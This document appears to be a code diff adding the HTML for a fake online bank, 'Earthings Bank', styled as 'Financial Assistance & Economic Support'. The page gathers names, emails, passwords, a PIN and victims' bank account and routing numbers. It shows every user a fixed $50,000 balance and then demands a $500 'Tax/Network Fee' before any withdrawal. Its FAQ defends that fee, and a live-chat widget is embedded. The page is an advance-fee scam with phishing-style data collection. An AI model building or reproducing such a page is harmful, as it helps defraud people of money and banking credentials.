@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Earthings Bank | Secure Banking</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg navbar-light sticky-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="fas fa-university me-2"></i> Financial Assistance & Economic Support
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="#" id="homeLink">Home</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#" id="aboutLink">About</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#" id="faqLink">FAQ</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#" id="contactLink">Contact</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#" id="logoutLink" style="display:none;">Logout</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section" id="heroSection">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-6 hero-content">
+                    <h1 class="display-4 fw-bold mb-4">Get Financial Assistance</h1>
+                    <p class="lead mb-4">Join thousands of satisfied people who trust us with their financial needs. Experience Financial Assistance redefined with security, convenience, and premium services.</p>
+                    <div class="d-flex gap-3 flex-wrap">
+                        <button class="btn btn-light btn-lg" id="loginBtn">Login to Account</button>
+                        <button class="btn btn-outline-light btn-lg" id="signupBtn">Open New Account</button>
+                    </div>
+                </div>
+                <div class="col-lg-6 text-center">
+                    <img src="img/img1.png" alt="Banking" class="img-fluid rounded shadow-lg" style="max-height: 400px;">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="container mb-5" id="featuresSection">
+        <div class="row text-center mb-5">
+            <div class="col">
+                <h2 class="fw-bold text-primary">Why Choose Financial Support?</h2>
+                <p class="lead">We provide cutting-edge financial solutions tailored to your needs</p>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-4">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h4>Advanced Security</h4>
+                    <p>Your funds and data are protected with Economic-level encryption and multi-factor authentication.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h4>Instant Transactions</h4>
+                    <p>Experience lightning-fast transactions with our optimized Assistance infrastructure.</p>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-headset"></i>
+                    </div>
+                    <h4>24/7 Support</h4>
+                    <p>Our dedicated customer service team is available round the clock to assist you.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Login Form -->
+    <div class="auth-container hidden" id="loginForm">
+        <div class="auth-header">
+            <h3><i class="fas fa-lock me-2"></i>Login to Your Account</h3>
+            <p class="mb-0">Access your financial dashboard</p>
+        </div>
+        <div class="auth-body">
+            <form id="loginFormElement">
+                <div class="mb-3">
+                    <label for="loginEmail" class="form-label">Email Address</label>
+                    <input type="email" class="form-control" id="loginEmail" required>
+                </div>
+                <div class="mb-3">
+                    <label for="loginPassword" class="form-label">Password</label>
+                    <input type="password" class="form-control" id="loginPassword" required>
+                </div>
+                <button type="submit" class="btn btn-primary w-100 mt-3">Login to Dashboard</button>
+            </form>
+            <div class="error-message" id="loginError"></div>
+        </div>
+        <div class="auth-footer">
+            <p>Don't have an account? <a href="#" id="showSignup">Sign up here</a></p>
+        </div>
+    </div>
+
+    <!-- Signup Form -->
+    <div class="auth-container hidden" id="signupForm">
+        <div class="auth-header">
+            <h3><i class="fas fa-user-plus me-2"></i>Create Your Account</h3>
+            <p class="mb-0">Join Earthings Bank today</p>
+        </div>
+        <div class="auth-body">
+            <form id="signupFormElement">
+                <div class="mb-3">
+                    <label for="signupName" class="form-label">Full Name</label>
+                    <input type="text" class="form-control" id="signupName" required>
+                </div>
+                <div class="mb-3">
+                    <label for="signupEmail" class="form-label">Email Address</label>
+                    <input type="email" class="form-control" id="signupEmail" required>
+                </div>
+                <div class="mb-3">
+                    <label for="signupPassword" class="form-label">Password</label>
+                    <input type="password" class="form-control" id="signupPassword" required>
+                </div>
+                <div class="mb-3">
+                    <label for="signupPin" class="form-label">Security PIN (4 digits)</label>
+                    <input type="password" class="form-control" id="signupPin" maxlength="4" pattern="\d{4}" required>
+                    <div class="form-text">Create a 4-digit PIN for transaction authorization</div>
+                </div>
+                <button type="submit" class="btn btn-primary w-100 mt-3">Create Account</button>
+            </form>
+            <div class="success-message" id="signupSuccess"></div>
+            <div class="error-message" id="signupError"></div>
+        </div>
+        <div class="auth-footer">
+            <p>Already have an account? <a href="#" id="showLogin">Login here</a></p>
+        </div>
+    </div>
+
+    <!-- Dashboard (Visible only after login) -->
+    <div class="dashboard-container hidden" id="dashboard">
+        <div class="greeting-card">
+            <h2 id="greetingText">Good Morning, User!</h2>
+            <p id="dateTime">Loading time...</p>
+        </div>
+        
+        <div class="balance-card">
+            <h3 class="mb-3"><i class="fas fa-wallet me-2"></i>Your Account Balance</h3>
+            <div class="balance-amount">$50,000.00</div>
+            <p class="text-muted">Available for withdrawal</p>
+        </div>
+        
+        <div class="withdraw-card">
+            <h3 class="mb-3"><i class="fas fa-money-bill-wave me-2"></i>Withdraw Funds</h3>
+            <button class="btn btn-primary" id="initiateWithdrawal">Initiate Withdrawal</button>
+            
+            <div class="withdraw-form mt-4" id="withdrawalForm">
+                <h5 class="mb-3">Enter Withdrawal Details</h5>
+                <form id="withdrawalFormElement">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="bankName" class="form-label">Bank Name</label>
+                                <input type="text" class="form-control" id="bankName" required>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="accountNumber" class="form-label">Account Number</label>
+                                <input type="text" class="form-control" id="accountNumber" required>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="routingNumber" class="form-label">Routing Number</label>
+                                <input type="text" class="form-control" id="routingNumber" required>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="mb-3">
+                                <label for="accountType" class="form-label">Account Type</label>
+                                <select class="form-control" id="accountType" required>
+                                    <option value="">Select Account Type</option>
+                                    <option value="checking">Checking</option>
+                                    <option value="savings">Savings</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mb-3">
+                        <label for="withdrawalAmount" class="form-label">Withdrawal Amount ($)</label>
+                        <input type="number" class="form-control" id="withdrawalAmount" min="1" max="50000" required>
+                    </div>
+                    <div class="mb-3">
+                        <label for="securityPin" class="form-label">Security PIN</label>
+                        <input type="password" class="form-control" id="securityPin" maxlength="4" required>
+                    </div>
+                    
+                   
+                    
+                    <button type="submit" class="btn btn-primary w-100">Confirm Withdrawal</button>
+                </form>
+                <div class="error-message" id="withdrawalError"></div>
+            </div>
+            
+            <!-- Withdrawal Receipt -->
+            <div class="withdrawal-receipt" id="withdrawalReceipt">
+                <div class="receipt-header">
+                    <h1 class="receipt-title">Financial Assistance & Economic Support</h1>
+                    <h2 class="receipt-subtitle">Withdrawal Confirmation</h2>
+                </div>
+                <div class="receipt-content">
+                    <p>You've initiated a withdrawal of your balance.</p>
+                    <p>To receive it in your bank, you are required to complete the <strong>Tax/Network Fee of <b>$500</b></strong>.</p>
+                    
+                    <div class="toggle-bar">
+                        <span><strong>STATUS:</strong></span>
+                        <span id="statusText">PENDING <i class="fas fa-chevron-down"></i></span>
+                    </div>
+                    <div class="toggle-content" id="statusDetails">
+                        <p>Your withdrawal request has been received and is pending payment of the required network fee.</p>
+                        <p>Once the fee is paid, your funds will be released immediately to your bank account.</p>
+                    </div>
+                    
+                    <p class="receipt-footer">Once the fee is paid, your funds will be released immediately in your bank.</p>
+                </div>
+                <div class="mt-4">
+                    <button class="btn btn-primary me-2" id="printReceipt"><i class="fas fa-print me-2"></i>Print Receipt</button>
+                    <button class="btn btn-outline-primary" id="newWithdrawal"><i class="fas fa-plus me-2"></i>New Withdrawal</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="faq-section">
+            <h3 class="mb-4"><i class="fas fa-question-circle me-2"></i>Frequently Asked Questions</h3>
+            
+            <div class="toggle-bar">
+                <span>What is the security PIN used for?</span>
+                <span><i class="fas fa-chevron-down"></i></span>
+            </div>
+            <div class="toggle-content">
+                <p>Your 4-digit security PIN is required to authorize transactions, especially withdrawals. This adds an extra layer of security to protect your funds.</p>
+            </div>
+            
+            <div class="toggle-bar">
+                <span>Why is there a $500 network fee for withdrawals?</span>
+                <span><i class="fas fa-chevron-down"></i></span>
+            </div>
+            <div class="toggle-content">
+                <p>The network fee covers transaction processing, security verification, and banking infrastructure costs. This ensures your funds are transferred securely and efficiently to your designated bank account.</p>
+            </div>
+            
+            <div class="toggle-bar">
+                <span>How long does it take to receive withdrawn funds?</span>
+                <span><i class="fas fa-chevron-down"></i></span>
+            </div>
+            <div class="toggle-content">
+                <p>Withdrawals are typically processed within 2-3 Minutes. Processing are always fast.</p>
+            </div>
+            
+            <div class="toggle-bar">
+                <span>Is my personal and banking information secure?</span>
+                <span><i class="fas fa-chevron-down"></i></span>
+            </div>
+            <div class="toggle-content">
+                <p>Yes, we use bank-level encryption and security protocols to protect your data. We never share your information with third parties without your consent.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-4 mb-4">
+                    <h4><i class="fas fa-university me-2"></i>Financial Assistance & Economic Support</h4>
+                    <p>Your trusted financial partner for all financial needs. We prioritize security, convenience, and customer satisfaction.</p>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Quick Links</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="#" class="text-light text-decoration-none">Home</a></li>
+                        <li><a href="#" class="text-light text-decoration-none">About Us</a></li>
+                        <li><a href="#" class="text-light text-decoration-none">Services</a></li>
+                        <li><a href="#" class="text-light text-decoration-none">FAQ</a></li>
+                    </ul>
+                </div>
+            <hr class="mt-4">
+            <div class="text-center py-3">
+                <p>&copy; 2023 Financial Assistance & Economic Support. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="script.js"></script>
+   
+        <!-- Begin of Chaport Live Chat code -->
+          <script type="text/javascript"> (function(w,d,v3){ w.chaportConfig = { appId : '68e4d894bbfc6e52647a9901', }; if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document); </script>
+          <!-- End of Chaport Live Chat code -->
+</body>
+</html>
